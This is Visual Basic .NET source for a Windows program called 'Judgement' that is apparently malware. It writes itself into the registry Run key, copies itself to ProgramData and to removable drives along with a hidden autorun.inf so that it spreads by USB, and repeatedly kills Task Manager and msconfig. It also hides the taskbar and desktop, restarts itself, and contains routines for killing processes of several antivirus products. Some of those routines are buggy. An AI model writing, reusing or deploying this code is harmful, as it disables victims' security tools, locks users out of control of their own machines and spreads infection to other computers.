Imports System.Runtime.InteropServices
Imports Microsoft.Win32

Public Class Form1
    Private TargetDT As DateTime
    Private CountDownFrom As TimeSpan = TimeSpan.FromSeconds(38)
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Int32
    Public Const SWP_HIDEWINDOW = &H80
    Public Const SWP_SHOWWINDOW = &H40
    Public Const SW_HIDE As Int32 = 0
    Public Const SW_RESTORE As Int32 = 9
    Dim taskBar As Integer
    Private vbAppWindows As Integer
    Public Property Button1 As Object
    <DllImport("winmm.dll")>
    Private Shared Function mciSendString(ByVal command As String, ByVal buffer As String, ByVal bufferSize As Integer, ByVal hwndCallback As IntPtr) As Integer
    End Function

    Public Sub RunAtStartup(ByVal ApplicationName As String, ByVal ApplicationPath As String)
        Dim CU As Microsoft.Win32.RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        With CU
            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)

            .SetValue(ApplicationName, ApplicationPath)

        End With
    End Sub

    Private Sub StartUp(sender As Object, e As EventArgs) Handles MyBase.Load ' Sub for Startup///
        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
    End Sub  'This allows the program to autorun on restart



    Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer) 'refuses shutdown
        If UnloadMode = vbAppWindows Then Cancel = True
    End Sub

    Private Sub Judgement()
        Me.Hide()
        Dim filepath As String
        filepath = Environ("homedrive") + "\programdata\Judgement.exe"
        FileCopy(Application.ExecutablePath, filepath)
        Do

            On Error Resume Next

            Dim rmdrive, strappath, strwinder, strautopath As String
            strappath = Application.ExecutablePath

            For Each drive As IO.DriveInfo In My.Computer.FileSystem.Drives
                If drive.DriveType = IO.DriveType.Removable Then
                    rmdrive = drive.ToString 'application copies to drive
                    FileCopy(strappath, rmdrive & "Judgement.exe")
                    strappath = rmdrive & "autorun.inf"

                    Dim sw As New System.IO.StreamWriter(strappath)
                    sw.WriteLine("[autorun]")
                    sw.WriteLine("shellexecute=Judgement.exe")
                    sw.Close()

                    SetAttr(strappath, CType(vbHidden + vbSystem + vbReadOnly, FileAttribute))
                    SetAttr(strappath, CType(vbHidden + vbSystem + vbReadOnly, FileAttribute))
                End If
            Next
            For Each pr As Process In Process.GetProcesses
                If pr.ProcessName = "taskmgr" Or pr.ProcessName = "msconfig" Then
                    pr.Kill()
                End If
            Next
        Loop
    End Sub

    Private Sub Block(sender As Object, e As EventArgs) ' Continuation of Block for Task Manager 
        Dim t As New Threading.Thread(AddressOf block)
        t.Start()
    End Sub
    Sub block()
        While True
            For Each p As Process In Process.GetProcessesByName("taskmgr")
                p.Kill()
            Next

            Threading.Thread.Sleep(100)
        End While
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Interval = 100
        TargetDT = DateTime.Now.Add(CountDownFrom)
        Timer1.Start()
        AxWindowsMediaPlayer1.URL = "C:\Users\Leeraoy.Jenkins\source\repos\Judgement\Resources\face.wmv"

        taskBar = FindWindow("Shell_traywnd", "")
        Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
        SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_HIDEWINDOW) 'This will "HIDE" your taskbar/// To bring back taskbar, simply change the end to: SWP_SHOWWINDOW///
        Dim hwnd As IntPtr
        hwnd = FindWindow(vbNullString, "Program Manager")
        If Not hwnd = 0 Then
            ShowWindow(hwnd, SW_HIDE) 'Type "RESTORE" to bring back///
        End If
        Application.Restart()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim ts As TimeSpan = TargetDT.Subtract(DateTime.Now) 'Start of Timer1 Code>>>>
        If ts.TotalMilliseconds > 0 Then
            Label1.Text = ts.ToString("ss")
        Else
            Label1.Text = "00:00"
            Timer1.Stop() ' End of Timer1 Code>>>
            MsgBox("Did you like that?")
            Evaluation.Show()
            Me.Hide()

        End If
    End Sub
    Sub Antiasquared()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "a2servic.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiMsMpEng()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "MsMpEng.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiAvast()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "ashWebSv.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiAVG()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "avgemc.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiBitDefender()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "bdagent"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiKaspersky()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "avp"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiMalwarebytes()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "mbam"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiMcAfee()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "mcagent" & "mcuimgr"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiNOD32()
        Dim KillTheProcess As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To KillTheProcess.Length - 1
            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
                Case "egui"
                    KillTheProcess(i).Kill()
                Case Else
            End Select
        Next
    End Sub
    Sub AntiNorton()
        Dim ktp As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To ktp.Length - 1
            Select Case Strings.LCase(ktp(i).ProcessName)
                Case "ccapp.exe"
                    ktp(i).Kill()
                Case Else
            End Select
        Next
    End Sub
End Class
